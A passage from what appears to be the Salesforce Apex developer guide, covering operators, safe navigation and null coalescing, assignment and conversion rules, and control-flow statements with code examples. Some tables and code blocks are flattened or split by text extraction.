**Ternary operator** (Right associative). This operator acts as a short-hand for if-then-else statements. If `x` , a Boolean, is true, `y` is the result. Otherwise `z` is the result.

```apex
x ? y : z
? :
```

`x` can’t be `null` . **AND logical operator** (Left associative). If `x` , a Boolean, and `y` , a Boolean, are both true, then the expression evaluates to true. Otherwise the expression evaluates to false. Note:

```apex
x && y
&&
```

`&&` has precedence over `||` This operator exhibits short-circuiting behavior, which means `y` is evaluated only if `x` is true. `x` and `y` can’t be `null` . **OR logical operator** (Left associative). If `x` , a Boolean, and `y` , a Boolean, are both false, then the expression evaluates to false. Otherwise the expression evaluates to true. Note:

```apex
x || y
||
```

`&&` has precedence over `||` This operator exhibits short-circuiting behavior, which means `y` is evaluated only if `x` is false. `x` and `y` can’t be `null` . **Equality operator** . If the value of `x` equals the value of `y` , the expression evaluates to true. Otherwise the expression evaluates to false. `x` `==` `y` `==` Unlike Java, `==` in Apex compares object value equality not reference equality, except for user-defined types. Therefore: String comparison using `==` is case-insensitive and is performed according to the locale of the context user ID comparison using `==` is case-sensitive and doesn’t distinguish between 15-character and 18-character formats User-defined types are compared by reference, which means that two objects are equal only if they reference the same location in memory. You can override this default comparison behavior by providing `equals` and `hashCode` methods in your class to compare object values instead. For sObjects and sObject arrays, `==` performs a deep check of all sObject field values before returning its result. Likewise for collections and built-in Apex objects. For records, every field must have the same value for `==` to evaluate to true. `x` or `y` can be the literal `null` . The comparison of any two values can never result in `null` . SOQL and SOSL use `=` for their equality operator and not `==` . Although Apex and SOQL and SOSL are strongly linked, this unfortunate syntax discrepancy exists because most modern languages use `=` for assignment and `==` for equality. The designers of Apex deemed it more valuable to maintain this paradigm than to force developers to learn a new assignment operator. As a result, Apex developers must use `==` for equality tests in the main body of the Apex code, and `=` for equality in SOQL and SOSL queries. **Exact equality operator** . If `x` and `y` reference the exact same location in memory the expression evaluates to true. Otherwise the expression evaluates to false. `x` `===` `y` `===` **Less than operator** . If `x` is less than `y` , the expression evaluates to true. Otherwise the expression evaluates to false. `x` `<` `y` `<` Unlike other database stored procedures, Apex doesn’t support tri-state Boolean logic and the comparison of any two values can never result in `null` . If `x` or `y` equal `null` and are Integers, Doubles, Dates, or Datetimes, the expression is false. A non- `null` String or ID value is always greater than a `null` value. If `x` and `y` are IDs, they must reference the same type of object. Otherwise a runtime error results. If `x` or `y` is an ID and the other value is a String, the String value is validated and treated as an ID. `x` and `y` can’t be Booleans. The comparison of two strings is performed according to the locale of the context user and is case-insensitive. **Greater than operator** . If `x` is greater than `y` , the expression evaluates to true. Otherwise the expression evaluates to false. `x` `>` `y` `>` The comparison of any two values can never result in `null` . If `x` or `y` equal `null` and are Integers, Doubles, Dates, or Datetimes, the expression is false. A non- `null` String or ID value is always greater than a `null` value. If `x` and `y` are IDs, they must reference the same type of object. Otherwise a runtime error results. If `x` or `y` is an ID and the other value is a String, the String value is validated and treated as an ID. `x` and `y` can’t be Booleans. The comparison of two strings is performed according to the locale of the context user and is case-insensitive. **Less than or equal to operator** . If `x` is less than or equal to `y` , the expression evaluates to true. Otherwise the expression evaluates to false. `x` `<=` `y` `<=` The comparison of any two values can never result in `null` . If `x` or `y` equal `null` and are Integers, Doubles, Dates, or Datetimes, the expression is false. A non- `null` String or ID value is always greater than a `null` value. If `x` and `y` are IDs, they must reference the same type of object. Otherwise a runtime error results. If `x` or `y` is an ID and the other value is a String, the String value is validated and treated as an ID. `x` and `y` can’t be Booleans. The comparison of two strings is performed according to the locale of the context user and is case-insensitive. **Greater than or equal to operator** . If `x` is greater than or equal to `y` , the expression evaluates to true. Otherwise the expression evaluates to false. `x` `>=` `y` `>=` The comparison of any two values can never result in `null` . If `x` or `y` equal `null` and are Integers, Doubles, Dates, or Datetimes, the expression is false. A non- `null` String or ID value is always greater than a `null` value. If `x` and `y` are IDs, they must reference the same type of object. Otherwise a runtime error results. If `x` or `y` is an ID and the other value is a String, the String value is validated and treated as an ID. `x` and `y` can’t be Booleans. The comparison of two strings is performed according to the locale of the context user and is case-insensitive. **Inequality operator** . If the value of `x` doesn’t equal the value of `y` , the expression evaluates to true. Otherwise the expression evaluates to false. `x` `!=` `y` `!=` String comparison using `!=` is case-insensitive Unlike Java, `!=` in Apex compares object value equality not reference equality, except for user-defined types. For sObjects and sObject arrays, `!=` performs a deep check of all sObject field values before returning its result. For records, `!=` evaluates to true if the records have different values for any field. User-defined types are compared by reference, which means that two objects are different only if they reference different locations in memory. You can override this default comparison behavior by providing `equals` and `hashCode` methods in your class to compare object values instead. `x` or `y` can be the literal `null` . The comparison of any two values can never result in `null` . **Exact inequality operator** . If `x` and `y` don’t reference the exact same location in memory, the expression evaluates to true. Otherwise the expression evaluates to false.

```apex
x !== y
!==
```

**Addition operator** . Adds the value of `x` to the value of `y` according to the following rules: `x` `+` `y` `+` If `x` and `y` are Integers or Doubles, the operator adds the value of `x` to the value of `y` . If a Double is used, the result is a Double. If `x` is a Date and `y` is an Integer, returns a new Date that is incremented by the specified number of days. If `x` is a Datetime and `y` is an Integer or Double, returns a new Date that is incremented by the specified number of days, with the fractional portion corresponding to a portion of a day. If `x` is a String and `y` is a String or any other type of non- `null` argument, concatenates `y` to the end of `x` . **Subtraction operator** . Subtracts the value of `y` from the value of `x` according to the following rules: `x` `-` `y` `-` If `x` and `y` are Integers or Doubles, the operator subtracts the value of `y` from the value of `x` . If a Double is used, the result is a Double. If `x` is a Date and `y` is an Integer, returns a new Date that is decremented by the specified number of days. If `x` is a Datetime and `y` is an Integer or Double, returns a new Date that is decremented by the specified number of days, with the fractional portion corresponding to a portion of a day. **Multiplication operator** . Multiplies `x` , an Integer or Double, with `y` , another Integer or Double. If a double is used, the result is a Double. `x` `*` `y` `*` **Division operator** . Divides `x` , an Integer or Double, by `y` , another Integer or Double. If a double is used, the result is a Double. `x` `/` `y` `/` **Logical complement operator** . Inverts the value of a Boolean so that true becomes false and false becomes true. `!x` `!` **Unary negation operator** . Multiplies the value of `x` , an Integer or Double, by -1. The positive equivalent `+` is also syntactically valid but doesn’t have a mathematical effect.

```apex
-x
-
```

**Increment operator** . Adds 1 to the value of `x` , a variable of a numeric type. If prefixed ( `++x` ), the expression evaluates to the value of x after the increment. If postfixed ( `x++` ), the expression evaluates to the value of x before the increment.

```apex
x++
```

```apex
++x
```

```apex
++
```

**Decrement operator** . Subtracts 1 from the value of `x` , a variable of a numeric type. If prefixed ( `--x` ), the expression evaluates to the value of x after the decrement. If postfixed ( `x--` ), the expression evaluates to the value of x before the decrement.

```apex
x--
```

```apex
--x
```

```apex
--
```

**Bitwise AND operator** . ANDs each bit in `x` with the corresponding bit in `y` so that the result bit is set to 1 if both of the bits are set to 1. `x` `&` `y` `&` **Bitwise OR operator** . ORs each bit in `x` with the corresponding bit in `y` so that the result bit is set to 1 if at least one of the bits is set to 1. `x` `|` `y` `|` **Bitwise exclusive OR operator** . Exclusive ORs each bit in `x` with the corresponding bit in `y` so that the result bit is set to 1 if exactly one of the bits is set to 1 and the other bit is set to 0.

```apex
x ^ y
^
```

**Bitwise exclusive OR operator** . Exclusive ORs each bit in `x` with the corresponding bit in `y` so that the result bit is set to 1 if exactly one of the bits is set to 1 and the other bit is set to 0. Assigns the result of the exclusive OR operation to `x` .

```apex
x ^= y
^=
```

**Bitwise shift left operator** . Shifts each bit in `x` to the left by `y` bits so that the high-order bits are lost and the new right bits are set to 0. `x` `<<` `y` `<<` **Bitwise shift right signed operator** . Shifts each bit in `x` to the right by `y` bits so that the low-order bits are lost and the new left bits are set to 0 for positive values of `y` and 1 for negative values of `y` .

```apex
x >> y
>>
```

**Bitwise shift right unsigned operator** . Shifts each bit in `x` to the right by `y` bits so that the low-order bits are lost and the new left bits are set to 0 for all values of `y` .

```apex
x >>> y
>>>
```

**Bitwise Not or Complement operator** . Toggles each binary digit of `x` , converting 0 to 1 and 1 to 0. Boolean values are converted from `True` to `False` and vice versa.

```apex
~x
~
```

**Parentheses** . Elevates the precedence of an expression `x` so that it’s evaluated first in a compound expression. `(x)` `()` **Safe navigation operator** . Short-circuits expressions that attempt to operate on a null value, and returns null instead of throwing a NullPointerException. If the x?.y `?.` left-hand side of the chain expression evaluates to null, the right-hand side of the chain expression isn’t evaluated.

#### Safe Navigation Operator

Use the safe navigation operator ( `?.` ) to replace explicit, sequential checks for null references. This operator short-circuits expressions that attempt to operate on a null value and returns null instead of throwing a NullPointerException. Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain terms to avoid any effect on customer implementations. If the left-hand-side of the chain expression evaluates to null, the right-hand-side isn’t evaluated. Use the safe navigation operator ( `?.` ) in method, variable, and property chaining. The part of the expression that isn’t evaluated can include variable references, method references, or array expressions. All Apex types are implicitly nullable and can hold a null value returned from the operator. This example first evaluates `a` , and returns null if `a` is null. Otherwise the return value is `a.b` .

```apex
a?.b // Evaluates to: a == null ? null : a.b
```

This example returns null if `a[x]` evaluates to null. If `a[x]` doesn’t evaluate to null and `aMethod()` returns null, then this expression throws a NullPointerException.

```apex
a[x]?.aMethod().aField // Evaluates to null if a[x] == null
```

This example returns null if `a[x].aMethod()` evaluates to null.

```apex
a[x].aMethod()?.aField
```

This example indicates that the type of the expression is the same whether the safe navigation operator is used in the expression or not.

```apex
Integer x = anObject?.anIntegerField; // The expression is of type Integer because the
field is of type Integer
```

This example shows a single statement replacing a block of code that checks for nulls.

```apex
// Previous code checking for nulls
String profileUrl = null;
if (user.getProfileUrl() != null) {
profileUrl = user.getProfileUrl().toExternalForm();
}
```

```apex
// New code using the safe navigation operator
String profileUrl = user.getProfileUrl()?.toExternalForm();
```

This example shows a single-row SOQL query using the safe navigation operator.

```apex
// Previous code checking for nulls
results = [SELECT Name FROM Account WHERE Id = :accId];
if (results.size() == 0) { // Account was deleted
```

```apex
return null;
}
return results[0].Name;
```

```apex
// New code using the safe navigation operator
return [SELECT Name FROM Account WHERE Id = :accId]?.Name;
```

**Table 1: Safe Navigation Operator Use-Cases** Can be used as a top-level statement. `aObject?.aMethod();` Method or variable or parameter chains The operator skips the method chain up to the first closing parenthesis. By adding the `((T)a1?.b1)?.c1()` Using parentheses, for example in a cast. operator after the parenthesis, the code safeguards the whole expression. If the operator is used elsewhere, and not after the parenthesis, the whole cast expression isn’t be safeguarded. For example, the behavior of

```apex
//Incorrect use of safe
navigation operator
((T)a1?.b1).c1()
```

is equivalent to:

```apex
T ref = null;
if (a1 != null) {
ref = (T)a1.b1;
}
result = ref.c1();
```

An SObject expression evaluates to null when the relationship is null. The behavior `String` `s` `=` `contact.Account?.BillingCity;` SObject chaining is equivalent to `String` `s` `=` `contact.Account.BillingCity` . If the SOQL query returns no objects, then the expression evaluates to null. The behavior is equivalent to:

```apex
List<Contact> contacts =
[SELECT LastName FROM
```

`String` `s` `=` `[SELECT` `LastName` `FROM` `Contact]?.LastName;` SOQL Queries

```apex
Contact];
String s;
if (contacts.size() == 0) {
```

```apex
s = null; // New behavior
when using Safe Navigation.
Earlier, this would throw
an exception. }
else if (contacts.size() ==
1) {
s =
contacts.get(0).LastName; }
else { // contacts.size() >
1 throw new
QueryException(...); }
```

You can’t use the Safe Navigation Operator in certain cases. Attempting to use the operator in these ways causes an error during compilation: Types and static expressions with dots. For example: Namespaces {Namespace}.{Class} Trigger.new Flow.interview.{flowName} {Type}.class Static variable access, method calls, and expressions. For example:

```apex
–
AClass.AStaticMethodCall()
```

```apex
–
AClass.AStaticVariable
```

```apex
–
String.format('{0}', 'hello
world')
```

```apex
–
Page.{pageName}
```

Assignable expressions. For example:

```apex
–
foo?.bar = 42;
```

```apex
–
++foo?.bar;
```

SOQL bind expressions. For example:

```apex
class X { public String query = 'xyz';}
X x = new X();
List<Account> accounts = [SELECT Name FROM Account WHERE Name = :X?.query]
List<List<SObject>> moreAccounts = [FIND :X?.query IN ALL FIELDS
RETURNING Account(Name)];
```

With `addError()` on SObject scalar fields. For example:

```apex
Contact c;
c.LastName?.addError('The field must have a value');
```

You can use the operator with `addError()` on SObjects, including lookup and master-detail fields.

#### Null Coalescing Operator

The `??` operator returns its right-hand side operand when its left-hand side operand is null. Similar to the safe navigation operator ( `?.` ), the null coalescing operator ( `??` ) replaces verbose and explicit checks for null references in code. The null coalescing operator is a binary operator in the form `a` `??` `b` that returns `a` if `a` isn’t null, and otherwise returns `b` . The operator is left-associative. The left-hand operand is evaluated only one time. The right-hand operand is only evaluated if the left-hand operand is null. You must ensure type compatibility between the operands. For example, in the expression: `objectZ` `result` `=` `objectA` `??` `objectB` , both `objectA` and `objectB` must be instances of objectZ to avoid a compile-time error. Here’s a comparison that illustrates the operator usage. Before the Null Coalescing Operator, you used:

```apex
Integer notNullReturnValue = (anInteger != null) ? anInteger : 100;
```

With the Null Coalescing Operator, use:

```apex
Integer notNullReturnValue = anInteger ?? 100;
```

While using the null coalescing operator, always keep operator precedence in mind. In some cases, using parentheses is necessary to obtain the desired results. For example, the expression `top` `??` `100` `-` `bottom` `??` `0` evaluates to `top` `??` `(100` `-` `bottom` `??` `0)` and not to `(top` `??` `100)` `-` `(bottom` `??` `0)` . Apex supports assignment of a single resultant record from a SOQL query, but throws an exception if there are no rows returned by the query. The null coalescing operator can be used to gracefully deal with the case where the query doesn’t return any rows. If a SOQL query is used as the left-hand operand of the operator and rows are returned, then the null coalescing operator returns the query results. If no rows are returned, the null coalescing operator returns the right-hand operand. Salesforce recommends against using multiple SOQL queries in a single statement that also uses the null coalescing operator. These examples work with Account objects.

```apex
Account defaultAccount = new Account(name = 'Acme');
// Left operand SOQL is empty, return defaultAccount from right operand:
Account a = [SELECT Id FROM Account
WHERE Id = '001000000FAKEID'] ?? defaultAccount;
Assert.areEqual(defaultAccount, a);
```

```apex
// If there isn't a matching Account or the Billing City is null, replace the value
string city = [Select BillingCity
From Account
Where Id = '001xx000000001oAAA']?.BillingCity;
System.debug('Matches count: ' + city?.countMatches('San Francisco') ?? 0 );
```

There are some restrictions on using the null coalescing operator. You can’t use the null coalescing operator as the left side of an assignment operator in an assignment.

```apex
–
foo??bar = 42;// This is not a valid assignment
```

```apex
–
foo??bar++; // This is not a valid assignment
```

SOQL bind expressions don’t support the null coalescing operator.

```apex
class X { public String query = 'xyz';}
X x = new X();
List<Account> accounts = [SELECT Name FROM Account WHERE Name = :X??query]
List<List<SObject>> moreAccounts = [FIND :X??query IN ALL FIELDS
RETURNING Account(Name)];
```

Operator Precedence Using SOQL Queries That Return One Record

#### Operator Precedence

Operators are interpreted in order, according to rules. Apex uses the following operator precedence rules: Grouping and prefix increments and decrements `{}` `()` `++` `--` 1 Unary operators, additive operators, type cast and object creation `~` `!` `-x` `+x` `(type)` `new` 2 Multiplication and division `*` `/` 3 Addition and subtraction `+` `-` 4 Shift Operators `<<` `>>` `>>>` 5 Greater-than and less-than comparisons, reference tests `<` `<=` `>` `>=` `instanceof` 6 Comparisons: equal and not-equal `==` `!=` 7 Bitwise AND `&` 8 Bitwise XOR `^` 9 Bitwise OR `|` 10 Logical AND `&&` 11 Logical OR `||` 12 Null Coalescing `??` 13 Ternary `?:` 14 Assignment operators `=` `+=` `-=` `*=` `/=` `&=` `<<=` `>>=` `>>>=` 15

#### Comments

Both single and multiline comments are supported in Apex code. We recommend using the standardized ApexDoc comment format to increase code readability, collaboration, and long-term maintainability. For the full specifications, see Document Your Apex Code on page 244. To create a single line comment, use `//` . All characters on the same line to the right of the `//` are ignored by the parser. For example:

```apex
Integer i = 1; // This comment is ignored by the parser
```

To create a multiline comment, use `/*` and `*/` to demarcate the beginning and end of the comment block. For example:

```apex
Integer i = 1; /* This comment can wrap over multiple
lines without getting interpreted by the
parser. */
```

### Assignment Statements

An assignment statement is any statement that places a value into a variable. An assignment statement generally takes one of two forms:

```apex
[LValue] = [new_value_expression];
[LValue] = [[inline_soql_query]];
```

In the forms above, `[LValue]` stands for any expression that can be placed on the left side of an assignment operator. These include: A simple variable. For example:

```apex
Integer i = 1;
Account a = new Account();
Account[] accts = [SELECT Id FROM Account];
```

A de-referenced list element. For example:

```apex
ints[0] = 1;
accts[0].Name = 'Acme';
```

An sObject field reference that the context user has permission to edit. For example:

```apex
Account a = new Account(Name = 'Acme', BillingCity = 'San Francisco');
```

```apex
// IDs cannot be set prior to an insert call
// a.Id = '00300000003T2PGAA0';
```

```apex
// Instead, insert the record. The system automatically assigns it an ID.
insert a;
```

```apex
// Fields also must be writable for the context user
// a.CreatedDate = System.today();
This code is invalid because
//
createdDate is read-only!
```

```apex
// Since the account a has been inserted, it is now possible to
// create a new contact that is related to it
Contact c = new Contact(LastName = 'Roth', Account = a);
```

```apex
// Notice that you can write to the account name directly through the contact
c.Account.Name = 'salesforce.com';
```

Assignment is always done by reference. For example:

```apex
Account a = new Account();
Account b;
Account[] c = new Account[]{};
a.Name = 'Acme';
b = a;
c.add(a);
```

```apex
// These asserts should now be true. You can reference the data
// originally allocated to account a through account b and account list c.
System.assertEquals(b.Name, 'Acme');
System.assertEquals(c[0].Name, 'Acme');
```

Similarly, two lists can point at the same value in memory. For example:

```apex
Account[] a = new Account[]{new Account()};
Account[] b = a;
a[0].Name = 'Acme';
System.assert(b[0].Name == 'Acme');
```

In addition to `=` , other valid assignment operators include `+=` , `*=` , `/=` , `|=` , `&=` , `++` , and `--` . See Expression Operators on page 40.

### Rules of Conversion

In general, Apex requires you to explicitly convert one data type to another. For example, a variable of the Integer data type cannot be implicitly converted to a String. You must use the `string.format` method. However, a few data types can be implicitly converted, without using a method. Numbers form a hierarchy of types. Variables of lower numeric types can always be assigned to higher types without explicit conversion. The following is the hierarchy for numbers, from lowest to highest: **1.** Integer **2.** Long **3.** Double **4.** Decimal Once a value has been passed from a number of a lower type to a number of a higher type, the value is converted to the higher type of number. Note that the hierarchy and implicit conversion is unlike the Java hierarchy of numbers, where the base interface number is used and implicit object conversion is never allowed. In addition to numbers, other data types can be implicitly converted. The following rules apply: IDs can always be assigned to Strings. Strings can be assigned to IDs. However, at runtime, the value is checked to ensure that it is a legitimate ID. If it is not, a runtime exception is thrown. The `instanceOf` keyword can always be used to test whether a string is an ID.

#### Additional Considerations for Data Types

**Data Types of Numeric Values** Numeric values represent Integer values unless they are appended with L for a Long or with .0 for a Double or Decimal. For example, the expression `Long` `d` `=` `123;` declares a Long variable named d and assigns it to an Integer numeric value (123), which is implicitly converted to a Long. The Integer value on the right hand side is within the range for Integers and the assignment succeeds. However, if the numeric value on the right hand side exceeds the maximum value for an Integer, you get a compilation error. In this case, the solution is to append L to the numeric value so that it represents a Long value which has a wider range, as shown in this example: `Long` `d` `=` `2147483648L;` . **Overflow and Underflow of Data Type Values** Arithmetic computations that produce values larger than the maximum value of the current type are said to overflow and values lower than the minimum value of the current type are said to be underflow. Apex doesn’t throw an exception for overflow and underflow of data type values. For example, `Integer` `i` `=` `2147483647` `+` `1;` yields a value of –2147483648 because 2147483647 is the maximum value for an Integer, so adding one to it wraps the value around to the minimum negative value for Integers: –2147483648. Similarly, subtracting one from the minimum integer -2,147,483,648 wraps the value around to the maximum value for Integers: 2,147,483,647. If arithmetic computations generate results larger than the maximum value for the current type, the end result will be incorrect because the computed values that are larger than the maximum will overflow. For example, the expression `Long` `MillsPerYear` `=` `365` `*` `24` `*` `60` `*` `60` `*` `1000;` results in an incorrect result because the products of Integers on the right hand side are larger than the maximum Integer value and they overflow. As a result, the final product isn't the expected one. You can avoid this by ensuring that the type of numeric values or variables you are using in arithmetic operations are large enough to hold the results. In this example, append L to numeric values to make them Long so the intermediate products will be Long as well and no overflow occurs. The following example shows how to correctly compute the amount of milliseconds in a year by multiplying Long numeric values.

```apex
Long MillsPerYear = 365L * 24L * 60L * 60L * 1000L;
Long ExpectedValue = 31536000000L;
System.assertEquals(MillsPerYear, ExpectedValue);
```

**Loss of Fractions in Divisions** When dividing numeric Integer or Long values, the fractional portion of the result, if any, is removed before performing any implicit conversions to a Double or Decimal. For example, `Double` `d` `=` `5/3;` returns 1.0 because the actual result (1.666...) is an Integer and is rounded to 1 before being implicitly converted to a Double. To preserve the fractional value, ensure that you are using Double or Decimal numeric values in the division. For example, `Double` `d` `=` `5.0/3.0;` returns 1.6666666666666667 because 5.0 and 3.0 represent Double values, which results in the quotient being a Double as well and no fractional value is lost. **Conversion of Date to Datetime** Apex supports both implicit and explicit casting of Date values to Datetime, with the time component being zeroed out in the resulting Datetime value.

## Control Flow Statements

Apex provides if-else statements, switch statements, and loops to control the flow of code execution. Statements are generally executed line by line, in the order they appear. With control flow statements, you can make Apex code execute based on a certain condition, or have a block of code execute repeatedly. Conditional (If-Else) Statements The conditional statement in Apex works similarly to Java. Switch Statements Apex provides a `switch` statement that tests whether an expression matches one of several values and branches accordingly. Loops Apex supports five types of procedural loops.

### Conditional (If-Else) Statements

The conditional statement in Apex works similarly to Java.

```apex
if ([Boolean_condition])
```

```apex
// Statement 1
else
```

```apex
// Statement 2
```

The `else` portion is always optional, and always groups with the closest `if` . For example:

```apex
Integer x, sign;
// Your code
if (x <= 0) if (x == 0) sign = 0; else sign = -1;
```

is equivalent to:

```apex
Integer x, sign;
// Your code
if (x <= 0) {
if (x == 0) {
sign = 0;
} else
{
sign = -1;
}
}
```

Repeated `else` `if` statements are also allowed. For example:

```apex
if (place == 1) {
medal_color = 'gold';
} else if (place == 2) {
medal_color = 'silver';
} else if (place == 3) {
medal_color = 'bronze';
} else {
medal_color = null;
}
```

### Switch Statements

Apex provides a `switch` statement that tests whether an expression matches one of several values and branches accordingly. The syntax is:

```apex
switch on expression {
when value1 {
// when block 1
// code block 1
}
when value2 {
// when block 2
```

```apex
// code block 2
}
when value3 {
// when block 3
// code block 3
}
when else {
// default block, optional
// code block 4
}
}
```

The `when` value can be a single value, multiple values, or sObject types. For example:

```apex
when value1 {
}
```

```apex
when value2, value3 {
}
```

```apex
when TypeName VariableName {
}
```

The `switch` statement evaluates the expression and executes the code block for the matching `when` value. If no value matches, the `when` `else` code block is executed. If there isn’t a `when` `else` block, no action is taken. There is no fall-through. After the code block is executed, the `switch` statement exits. Apex `switch` statement expressions can be one of the following types. Integer Long sObject String Enum

#### When Blocks

Each `when` block has a value that the expression is matched against. These values can take one of the following forms. when `literal` {} (a when block can have multiple, comma-separated literal clauses) when SObjectType `identifier` {} when `enum_value` {} The value `null` is a legal value for all types. Each `when` value must be unique. For example, you can use the literal `x` only in one `when` block clause. A `when` block is matched one time at most.

#### When Else Block

If no `when` values match the expression, the `when` `else` block is executed. Salesforce recommends including a `when` `else` block, especially with enum types, although it isn’t required. When you build a `switch` statement using enum values provided by a managed package, your code might not behave as expected if a new version of the package contains additional enum values. You can prevent this problem by including a `when` `else` block to handle unanticipated values. If you include a `when` `else` block, it must be the last block in the `switch` statement.

#### Examples with Literals

You can use literal `when` values for switching on Integer, Long, and String types. String clauses are case-sensitive. For example, “orange” is a different value than “ORANGE.” **Single Value Example** The following example uses integer literals for `when` values.

```apex
switch on i {
when 2 {
System.debug('when block 2');
}
when -3 {
System.debug('when block -3');
}
when else {
System.debug('default');
}
}
```

**Null Value Example** Because all types in Apex are nullable, a `when` value can be `null` .

```apex
switch on i {
when 2 {
System.debug('when block 2');
}
when null {
System.debug('bad integer');
}
when else {
System.debug('default ' + i);
}
}
```

**Multiple Values Examples** The Apex `switch` statement doesn’t fall-through, but a `when` clause can include multiple literal values to match against. You can also nest Apex `switch` statements to provide multiple execution paths within a `when` clause.

```apex
switch on i {
when 2, 3, 4 {
System.debug('when block 2 and 3 and 4');
}
when 5, 6 {
System.debug('when block 5 and 6');
}
when 7 {
System.debug('when block 7');
}
```

```apex
when else {
System.debug('default');
}
}
```

**Method Example** Instead of switching on a variable expression, the following example switches on the result of a method call.

```apex
switch on someInteger(i) {
when 2 {
System.debug('when block 2');
}
when 3 {
System.debug('when block 3');
}
when else {
System.debug('default');
}
}
```

#### Example with sObjects

Switching on an sObject value allows you to implicitly perform `instanceof` checks and casting. For example, consider the following code that uses if-else statements.

```apex
if (sobject instanceof Account) {
Account a = (Account) sobject;
System.debug('account ' + a);
} else if (sobject instanceof Contact) {
Contact c = (Contact) sobject;
System.debug('contact ' + c);
} else {
System.debug('default');
}
```

You can replace and simplify this code with the following `switch` statement.

```apex
switch on sobject {
when Account a {
System.debug('account ' + a);
}
when Contact c {
System.debug('contact ' + c);
}
when null {
System.debug('null');
}
when else {
System.debug('default');
}
}
```

You can use only one sObject type per `when` block.

#### Example with Enums

A `switch` statement that uses enum `when` values doesn’t require a `when` `else` block, but it is recommended. You can use multiple enum values per `when` block clause.

```apex
switch on season {
when WINTER {
System.debug('boots');
}
when SPRING, SUMMER {
System.debug('sandals');
}
when else {
System.debug('none of the above');
}
}
```

### Loops

Apex supports five types of procedural loops. These types of procedural loops are supported:

```apex
•
do {statement} while (Boolean_condition);
```

```apex
•
while (Boolean_condition) statement;
```

```apex
•
for (initialization; Boolean_exit_condition; increment) statement;
```

```apex
•
for (variable : array_or_set) statement;
```

```apex
•
for (variable : [inline_soql_query]) statement;
```

All loops allow for loop control structures: `break` `;` exits the entire loop `continue` `;` skips to the next iteration of the loop 1. Do-While Loops 2. While Loops 3. For Loops

#### Do-While Loops

The Apex `do` `-` `while` loop repeatedly executes a block of code as long as a particular Boolean condition remains true. Its syntax is:

```apex
do {
code_block
} while (condition);
```

Curly braces ( `{}` ) are always required around a `code_block` . As in Java, the Apex `do` `-` `while` loop does not check the Boolean condition statement until after the first loop is executed. Consequently, the code block always runs at least once. As an example, the following code outputs the numbers 1 - 10 into the debug log:

```apex
Integer count = 1;
```

```apex
do {
System.debug(count);
count++;
} while (count < 11);
```

#### While Loops

The Apex `while` loop repeatedly executes a block of code as long as a particular Boolean condition remains true. Its syntax is:

```apex
while (condition) {
code_block
}
```

Curly braces ( `{}` ) are required around a `code_block` only if the block contains more than one statement. Unlike `do` `-` `while` , the `while` loop checks the Boolean condition statement before the first loop is executed. Consequently, it is possible for the code block to never execute. As an example, the following code outputs the numbers 1 - 10 into the debug log:

```apex
Integer count = 1;
```

```apex
while (count < 11) {
System.debug(count);
count++;
}
```

#### For Loops

Apex supports three variations of the `for` loop: The traditional `for` loop:

```apex
for (init_stmt; exit_condition; increment_stmt) {
code_block
}
```

The list or set iteration `for` loop:

```apex
for (variable : list_or_set) {
code_block
}
```

where `variable` must be of the same primitive or sObject type as `list_or_set` . The SOQL `for` loop:

```apex
for (variable : [soql_query]) {
code_block
}
```

or

```apex
for (variable_list : [soql_query]) {
code_block
}
```

Both `variable` and `variable_list` must be of the same sObject type as is returned by the `soql_query` . Curly braces ( `{}` ) are required around a `code_block` only if the block contains more than one statement. Each is discussed further in the sections that follow. Traditional For Loops List or Set Iteration for Loops Iterating Collections The traditional `for` loop in Apex corresponds to the traditional syntax used in Java and other languages. Its syntax is:

```apex
for (init_stmt; exit_condition; increment_stmt) {
code_block
}
```

When executing this type of `for` loop, the Apex runtime engine performs the following steps, in order: **1.** Execute the `init_stmt` component of the loop. Note that multiple variables can be declared and/or initialized in this statement, separated by commas. **2.** Perform the `exit_condition` check. If true, the loop continues. If false, the loop exits. **3.** Execute the `code_block` . **4.** Execute the `increment_stmt` statement. **5.** Return to Step 2. As an example, the following code outputs the numbers 1 - 10 into the debug log. Note that an additional initialization variable, `j` , is included to demonstrate the syntax:

```apex
for (Integer i = 0, j = 0; i < 10; i++) {
System.debug(i+1);
}
```

The list or set iteration `for` loop iterates over all the elements in a list or set. Its syntax is:

```apex
for (variable : list_or_set) {
code_block
}
```

where `variable` must be of the same primitive or sObject type as `list_or_set` . When executing this type of `for` loop, the Apex runtime engine assigns `variable` to each element in `list_or_set` , and runs the `code_block` for each value. For example, the following code outputs the numbers 1 - 10 to the debug log:

```apex
Integer[] myInts = new Integer[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
```

```apex
for (Integer i : myInts) {
System.debug(i);
}
```

Collections can consist of lists, sets, or maps. Modifying a collection's elements while iterating through that collection is not supported and causes an error. Do not directly add or remove elements while iterating through the collection that includes them. Adding Elements During Iteration To add elements while iterating a list, set or map, keep the new elements in a temporary list, set, or map and add them to the original after you finish iterating the collection. Removing Elements During Iteration To remove elements while iterating a list, create a new list, then copy the elements you wish to keep. Alternatively, add the elements you wish to remove to a temporary list and remove them after you finish iterating the collection. The `List.remove` method performs linearly. Using it to remove elements has time and resource implications. To remove elements while iterating a map or set, keep the keys you wish to remove in a temporary list, then remove them after you finish iterating the collection.

## Classes, Objects, and Interfaces

Apex classes are modeled on their counterparts in Java. You’ll define, instantiate, and extend classes, and you’ll work with interfaces, Apex class versions, properties, and other related class concepts. 1. Classes As in Java, you can create classes in Apex. A class is a template or blueprint from which objects are created. An object is an instance of a class. 2. Interfaces An interface is like a class in which none of the methods have been implemented—the method signatures are there, but the body of each method is empty. To use an interface, another class must implement it by providing a body for all of the methods contained in the interface. 3. Keywords Apex provides the keywords `final` , `instanceof` , `super` , `this` , `transient` , `with` `sharing` and `without` `sharing` . 4. Annotations An Apex annotation modifies the way that a method or class is used, similar to annotations in Java. Annotations are defined with an initial `@` symbol, followed by the appropriate keyword. 5. Classes and Casting In general, all type information is available at run time. This means that Apex enables casting , that is, a data type of one class can be assigned to a data type of another class, but only if one class is a subclass of the other class. Use casting when you want to convert an object from one data type to another. 6. Differences Between Apex Classes and Java Classes Apex classes and Java classes work in similar ways, but there are some significant differences. 7. Class Definition Creation Use the class editor to create a class in Salesforce. 8. Namespace Prefix The Salesforce application supports the use of namespace prefixes . Namespace prefixes are used in managed AppExchange packages to differentiate custom object and field names from names used by other organizations. 9. Apex Code Versions To aid backwards-compatibility, classes and triggers are stored with the version settings for a specific Salesforce API version. 10. Lists of Custom Types and Sorting Lists can hold objects of your user-defined types (your Apex classes). Lists of user-defined types can be sorted. 11. Using Custom Types in Map Keys and Sets You can add instances of your own Apex classes to maps and sets.

### Classes

